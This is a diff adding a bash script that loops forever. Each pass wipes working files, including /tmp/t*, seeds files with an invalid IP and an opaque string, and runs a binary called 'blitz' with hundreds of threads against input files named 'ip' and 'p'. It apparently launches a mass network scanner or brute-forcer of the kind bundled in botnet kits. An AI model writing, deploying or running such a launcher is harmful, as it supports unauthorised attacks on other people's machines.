@@ -1,0 +1,54 @@
+#!/bin/bash
+dir=`pwd`
+cd $dir
+
+threads=515
+
+ARCH=`uname -m`
+if [[ "$ARCH" =~ ^arm ]]; then
+	threads=75
+fi
+
+if [[ "$ARCH"  == "i686" ]]; then
+	threads=300
+fi
+
+cont=1
+
+		while :
+		do
+		start=$(date +%s)
+		touch v
+		rm -rf p
+		rm -rf ip
+		rm -rf xtr*
+		rm -rf a a.*
+		rm -rf b b.*
+		echo "257.287.563.234" >> c
+		echo "257.287.563.234" >> c
+		echo "sdaferthqhr34312asdfa" >> d
+		echo "sdaferthqhr34312asdfa" >> d
+
+		sleep $[ ( $RANDOM % 30 )  + 1 ]s
+		timeout 24h ./blitz -t $threads -f 1 -s 12 -S 8 -p 0 -d 1 p ip
+		sleep 3
+		end=$(date +%s)
+
+#		if [[ $(($end-$start))  -lt "180" ]]; then
+#			let threads=threads-50
+#			let cont=cont+1
+#			if [[ $(($threads))  -lt "80" ]]; then
+#						./stop
+#			fi
+#			if [[ $(($cont))  -gt "6" ]]; then
+#						./stop
+#			fi
+#		fi
+
+		rm -rf xtr*
+		rm -rf ip
+		rm -rf p
+		rm -rf .out
+		rm -rf /tmp/t*
+		done
+exit 0
